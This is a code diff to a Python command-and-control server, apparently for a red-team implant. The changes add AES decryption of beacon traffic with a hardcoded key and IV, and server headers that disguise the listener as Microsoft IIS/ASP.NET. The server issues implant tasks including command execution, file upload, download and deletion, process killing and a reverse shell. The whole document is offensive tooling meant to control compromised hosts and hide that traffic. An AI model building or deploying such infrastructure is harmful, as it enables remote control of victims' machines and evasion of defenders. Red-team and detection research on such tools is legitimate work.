@@ -10,6 +10,7 @@ import time
 from termcolor import colored
 import ssl
 import helpmenu
+from generatecert import generate_certs
 
 ################## for aes testing
 import hashlib
@@ -19,18 +20,22 @@ from Crypto.Cipher import AES
 import binascii
 from binascii import unhexlify
 
-class AesEncryption:
+class bcolors:
+    green = "\033[32m"
+    end   = "\033[0m"
 
-    def decrypt(enc):    
-        # define the generated IV and KEY here (hardcoded in implant)
-        key = unhexlify("b0ef0db4afc2a388e7fd4c40f1c90b07")
-        IV = unhexlify("c2a55e988b042cd962c1f18b78538315") 
-         
-        cipher = AES.new(key, AES.MODE_CBC, IV)
-        decrypt = cipher.decrypt(enc)
-        return decrypt
+def decryptAes(data):  
+    # these values shouldn't be hardcoded
+    key = unhexlify('b0ef0db4afc2a388e7fd4c40f1c90b07')
+    IV = unhexlify('c2a55e988b042cd962c1f18b78538315')
 
-####################
+    cipher = AES.new(key,AES.MODE_CBC,IV)
+    decipher = AES.new(key,AES.MODE_CBC,IV)
+    plaintext = decipher.decrypt(data)
+    cleaned_decrypted = unpad(plaintext, AES.block_size)
+
+    return cleaned_decrypted
+
 
 def buildResponse():
 
@@ -44,50 +49,52 @@ def buildResponse():
 
     return b64_response
  
+current_dir = os.getcwd() 
 class ServerValues:
     SRVPORT = ""
     SSL = True
-    SSLCERT = 'localhost.pem'
+    KEY_FILE = current_dir + "/hightower.key"
+    CERT_FILE = current_dir + "/hightower.crt"
     
 class RequestHandler(BaseHTTPRequestHandler):
 
     # response headers    
     def _headers(self):
+        self.server_version = "Microsoft-IIS/10.0"
+        self.sys_version = ""
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=UTF-8")
         self.send_header("X-Powered-By", "ASP.NET")
         self.end_headers()
 
+    def do_HEAD(self):
+        self._headers()
+    def do_OPTIONS(self):
+        self._headers()
+    def do_PUT(self):
+        self._headers()
+
     def do_POST(self):
         #print("\nConnection from: {} ".format(self.client_address[0]))
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
-
-        ######################## lets test aes decryption here
-        """
-        decrypted_data = AesEncryption.decrypt(post_data)
-        #decrypted_data = unpad(AesEncryption.decrypt(post_data[AES.block_size:]), AES.block_size)
-        
-        print(type(decrypted_data))
-        print(decrypted_data)
-        print("\n\n\n")
-        ########################
-        """   
-        data = base64.b64decode(post_data)          
-        parse_data = json.loads(data.decode("utf-8"))
+                
+        base64_decoded_data = base64.b64decode(post_data)          
+        decrypted_data = decryptAes(base64_decoded_data)
+        parse_data = json.loads(decrypted_data.decode("utf-8"))
        
         if self.path.startswith("/finish"):                   
+        
             print("\n" + parse_data["task_result"] + "\n")               
             RequestHandler.command = "empty_response"   
             
         if self.path.startswith("/update"):  
-                                            
+                        
+            #parse_data = json.loads(base64_decoded_data.decode("utf-8"))                        
             data_response = buildResponse()   
                         
             self.wfile.write(data_response)          
-            RequestHandler.recentUpdate = parse_data
-         
-            #RequestHandler.command = "empty_response"  
+            RequestHandler.recentUpdate = parse_data  
 
     def do_GET(self):
         self._headers()
@@ -106,38 +113,43 @@ class RequestHandler(BaseHTTPRequestHandler):
         
     def log_message(self, format, *args):
         return
-
+        
 def run(port):
     server = ('localhost', int(port))
     httpd = HTTPServer(server, RequestHandler)
-    RequestHandler.server_version = "Microsoft-IIS/10.0"
-    RequestHandler.sys_version = ""
+ #   RequestHandler.server_version = "Microsoft-IIS/10.0"
+ #   RequestHandler.sys_version = ""
+    
+    current_dir = os.getcwd()
     
     if ServerValues.SSL == True:
-        httpd.socket = ssl.wrap_socket(httpd.socket,server_side=True,certfile=ServerValues.SSLCERT,ssl_version=ssl.PROTOCOL_TLS)
+        httpd.socket = ssl.wrap_socket(httpd.socket,
+                                       keyfile = ServerValues.KEY_FILE,
+                                       certfile = ServerValues.CERT_FILE,
+                                       server_side=True,
+                                       ssl_version=ssl.PROTOCOL_TLS)
+    try:    
+        httpd.serve_forever()
+    except (KeyboardInterrupt, EOFError):
+        httpd.server_close()
+        print("[!] Server failed to start")
         
-    httpd.serve_forever()
    
 def checkCommandForInteraction(user_input):
 
     result = False
-
     commands_with_data = ["kill_pid", "exec_command", "find_files", "download_file", "upload_file", "delete_file", "rev_shell"]
 
     if user_input in commands_with_data:
         result = True
-        
+       
     return result
     
  
 RequestHandler.recentUpdate = ""
-  
-   
+    
 def main():    
-    
-    # TODO - make another general class for storing variables
-    # TODO - make a config class
-    
+        
     RequestHandler.command = "empty_response"
     RequestHandler.data = ""
 
@@ -173,11 +185,14 @@ def main():
             print("\033[32m[+] New task issued, waiting for response: \033[0m" + "\033[33m{} - {}\033[0m".format(RequestHandler.command, RequestHandler.data))
             
         if (command.split(" ")[0] == "!listen"):        
-            ServerValues.SRVPORT = command.split(" ")[1]              
-            thread = threading.Thread(target=run,name="t_server", args=(ServerValues.SRVPORT,))
-            thread.daemon = True 
-            thread.start()           
-            print("\033[32m[+] Webserver running on: \033[0m" + "\033[33mhttps://127.0.0.1:{}\033[0m".format(ServerValues.SRVPORT))
+            ServerValues.SRVPORT = command.split(" ")[1]  
+            if int(ServerValues.SRVPORT) > 65535:
+                print("[!] Port must be 0-65535")
+            else:            
+                thread = threading.Thread(target=run,name="t_server", args=(ServerValues.SRVPORT,))
+                thread.daemon = True 
+                thread.start()           
+                print(bcolors.green + "[+] Webserver running on: \033[0m" + "\033[33mhttps://127.0.0.1:{}\033[0m".format(ServerValues.SRVPORT))
             
         if (command == "!settings"):                
             if thread != False:
@@ -187,7 +202,7 @@ def main():
             #print("Server Port: {} \nServer Status: {}".format(port, thread_status))
         
             if ServerValues.SSL == True:
-                cert = ServerValues.SSLCERT
+                cert = ServerValues.CERT_FILE.rsplit("/", 1)[1]
                 certEnable = "Enabled"
             else:
                 cert = "Null"
@@ -199,7 +214,7 @@ def main():
         
         SRVPORT   \033[32m{:<15}\033[0m     yes         The local listening port
         SSL       \033[32m{:<15}\033[0m     yes         Use SSL/TLS for encrypted traffic
-        SSLCERT   \033[32m{:<15}\033[0m     yes         Path to the self-generated SSL certificate
+        SSLCERT   \033[32m{:<15}\033[0m     yes         Self-generated SSL certificate filename
         STATUS    \033[32m{:<15}\033[0m                 Server listening status           
         """.format(ServerValues.SRVPORT, certEnable, cert, thread_status))
         
@@ -224,8 +239,10 @@ def main():
                 # this requires uniq'ing the inbound beaconing requests by ID and display them in sessions
             else:
                 print("[!] No recent beacon check-ins")
+        
+        if (command == "!sslgen"):
+            generate_certs()
 
-        #RequestHandler.data = ""
            
 if __name__ == "__main__":
     main()
